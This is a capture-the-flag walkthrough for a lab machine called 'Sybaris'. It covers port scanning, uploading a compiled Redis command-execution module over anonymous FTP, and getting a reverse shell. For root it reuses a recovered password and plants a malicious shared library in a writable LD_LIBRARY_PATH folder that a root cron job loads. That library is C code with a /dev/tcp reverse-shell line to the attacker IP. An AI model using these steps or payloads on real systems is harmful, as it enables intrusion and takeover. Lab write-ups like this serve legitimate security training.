@@ -1,0 +1,164 @@
+																							               Sybaris Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.93
+export IP=192.168.68.93
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+20/tcp    closed ftp-data
+21/tcp    open   ftp
+22/tcp    open   ssh
+53/tcp    closed domain
+80/tcp    open   http
+6379/tcp  open   redis
+
+nmap -Pn -n -sC -sV -p20,21,22,80,6379 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp   open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
+|_http-title: Sybaris - Just another HTMLy blog
+|_http-generator: HTMLy v2.7.5
+| http-robots.txt: 11 disallowed entries 
+| /config/ /system/ /themes/ /vendor/ /cache/ 
+| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
+|_/admin/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
+6379/tcp open  redis   Redis key-value store 5.0.9
+Service Info: OS: Unix
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+robots.txt: Robots file
+
+http-phpmyadmin-dir-traversal: 
+|   VULNERABLE:
+|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
+
+nikto --url $IP
+
+Port 21 - FTP
+ftp anoynmous@IP
+ls -lsa
+drwxrwxrwx    2 0        0               6 Apr 01  2020 pub                   # It seems that we can upload files on FTP. Might be usefull later on
+
+Port 80 - HTTP
+
+http://192.168.68.93/login         # Login page discovered
+
+# Check the robots.txt file
+# Disallow files
+Disallow: /changelog.txt
+Disallow: /composer.json
+Disallow: /composer.lock
+Disallow: /composer.phar
+
+# Possible usernames??
+http://192.168.68.93//composer.json
+ircmaxell
+michelf
+suin
+kanti
+jbroadway
+
+# Common enumeration wordlists didn't not reveal anything out of the ordinary.
+# Searchsploit does reveal only a XSS vulnerability.
+# Testing for some default common credentials. No luck!
+
+# Let's switch to Redis
+
+You can compile a redis module to execute arbitrary commands if you find a way to upload a file on the server. Now since we know that we can upload files using the FTP server, we can go ahead and proceed with this exploit.
+
+Remember, the default path of vsftpd is normally at : /var/ftp/pub/<your_file>
+
+Exploitation Steps.
+
+1. git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
+2. cd RedisModules-ExecuteCommand 
+3. sudo make                                                     # after you run make, you will get the file module.so which we have to upload on the server and call it through our redis command line.
+4. ftp anonymous@$IP                                       # Connect back to the FTP server and upload the module.so file
+    cd pub
+    put module.so
+5. MODULE LOAD /var/ftp/pub/module.so            # Switch back to the redis cli and load module.so file
+6. MODULE LIST                                                # List loaded modules to check it was correctly loaded
+   1) "name"
+   2) "system"
+   3) "ver"
+   4) (integer) 1
+7. system.exec "id"                                             # Checking if we got access
+  "uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
+  
+8. system.exec "cat /etc/passwd" or system.exec "cat /home/pablo/local.txt"                    # We can retrieve files from the command line or we can go further and obtian a reverse shell. Which is what we need.
+9. nc -lvnp 80
+10. system.rev 192.168.49.68 80                           # Getting a reverse shell back on port 80, port 4444 does not seem to work!  Got shell!!
+
+cat /home/pablo/local.txt                                       # Flag: 2698e5c27d9f5b81a239d57d3d672ff7
+
+
+Privilege escalation
+
+cd /var/www/html/config/users
+cat pablo.ini
+password = PostureAlienateArson345
+role = admin
+
+ssh pablo@$IP
+PostureAlienateArson345
+
+cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
+MAILTO=""
+
+  *  *  *  *  * root       /usr/bin/log-sweeper
+
+# There is a shared object missing to run the library  
+  
+/usr/bin/log-sweeper
+/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory
+
+
+
+# Check the LD_Library path and let's see which ones provides us write rights.
+
+find / -type d -writable 2>/dev/null
+
+/tmp/.ICE-unix
+/usr/local/lib/dev
+/home/pablo
+
+# Since we don't have nano available, we can either create the .c file and then get it with wget or create in directly in the /usr/local/lib/dev. 
+
+cat <<EOF > exploit.c
+> #include <stdio.h>
+> #include <sys/types.h>
+> #include <stdlib.h>
+> 
+> void _init() {
+>     setgid(0);
+>     setuid(0);
+>     system("/bin/bash -i >& </dev/tcp/192.168.49.68/6379 0>&1");
+> }
+> EOF                                                                             # End it.
+
+# Compile the file using gcc
+
+gcc -shared -nostartfiles -fPIC  exploit.c -o utils.so
+
+# Wait for the cron job to run and have a netcat listener opened
+
+nc -lvnp 6379
+whoami
+root
+cd /root
+cat proof.txt                                      # Flag: 80e6ec11e5fbd6c732c76be9d095c287
+
